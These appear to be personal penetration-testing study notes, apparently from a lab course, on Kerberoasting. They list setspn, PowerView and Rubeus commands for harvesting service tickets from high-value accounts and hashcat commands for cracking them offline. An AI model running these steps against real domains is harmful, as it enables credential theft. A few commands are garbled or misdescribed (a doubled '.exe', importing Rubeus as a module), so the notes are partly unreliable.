Manual Kerberoasting Method
- From cmd line, you can run setspn.exe:
	- setspn..exe -Q */* 
		-After -Q it is asterisk/asterisk but prompt won't show the **

 - From PowerShell:
	 - Transfer PowerView tool script over to Victim Host
	 - Import-Module .\\PowerView.ps1
	 - Get-DomainUser * -spn | select samaccountname
		 - This will extract all TGS Tickets for the Domain
	- From list, you can run the following command to grab a ticket:
			- Get-DomainUser -Identity <targetedTGS> | Get-DomainSPNTicket -Format Hashcat
			OR
			- Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
				- This command will send all TGS to a CSV File for offline hash cracking


Rubeus is another tool that can perform the same as PowerView, provides a different output:
- Import-Module .\Rubeus.exe 
- .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
	- admincount=1 sets this query to go for high-value targets 
	- /nowrap makes sure that the hash can be easily copied for offline cracking


- After grabbing hashes, take them offline with hashcat:
	- hashcat -m 13100 targeted.txt <TGS you want to crack offline> /usr/share/wordlists/rockyou.txt --force
		- This will force hashcat to brute force the tickets

